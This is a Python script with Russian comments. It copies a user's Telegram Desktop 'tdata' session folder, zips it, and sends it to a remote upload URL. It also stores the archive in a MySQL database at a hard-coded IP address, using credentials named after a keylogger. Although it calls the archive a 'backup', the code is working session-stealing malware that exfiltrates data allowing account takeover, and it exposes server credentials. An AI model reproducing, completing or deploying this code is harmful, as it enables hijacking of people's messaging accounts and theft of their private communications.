import zipfile
import os
import shutil
import requests
import pymysql
from dotenv import load_dotenv

load_dotenv()

def zip_folder(folder_path, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)
                zipf.write(file_path, arcname)

def send_file_to_server(file_path, server_url):
    with open(file_path, 'rb') as f:
        response = requests.post(server_url, files={'file': f})
    return response

def save_file_to_db(file_path):
    connection = pymysql.connect(
        host='38.180.219.103',
        port=3306,
        user='user',
        password='Keylogger2024+',
        database='logger_db'
    )
    cursor = connection.cursor()
    with open(file_path, 'rb') as f:
        binary_data = f.read()
    cursor.execute("INSERT INTO files (file_name, file_data) VALUES (%s, %s)", (os.path.basename(file_path), binary_data))
    connection.commit()
    cursor.close()
    connection.close()

# Определяем переменные
folder_to_zip = os.path.join(os.getenv('APPDATA'), r'Telegram Desktop\tdata')
temp_folder = os.path.join(os.path.expanduser('~'), 'Desktop', 'tdata_temp')
output_zip = os.path.join(os.path.expanduser('~'), 'Desktop', 'tdata_backup.zip')
server_url = 'http://your-server-url/upload'  # Замените на URL вашего сервера

# Копируем папку, если доступ запрещен
if os.path.exists(folder_to_zip):
    try:
        if os.path.exists(temp_folder):
            shutil.rmtree(temp_folder)  # Удаляем временную папку, если она существует
        shutil.copytree(folder_to_zip, temp_folder)
        zip_folder(temp_folder, output_zip)
        shutil.rmtree(temp_folder)  # Удаляем временную папку
        print(f'Папка "{folder_to_zip}" успешно скопирована и сжата в "{output_zip}".')

        # Отправляем файл на сервер
        response = send_file_to_server(output_zip, server_url)
        if response.status_code == 200:
            print('Файл успешно отправлен на сервер.')
        else:
            print(f'Ошибка при отправке файла на сервер: {response.status_code}')

        # Сохраняем файл в базе данных
        save_file_to_db(output_zip)
        print('Файл успешно сохранен в базе данных.')
    except PermissionError as e:
        print(f'Ошибка доступа: {e}')
    except Exception as e:
        print(f'Произошла ошибка: {e}')
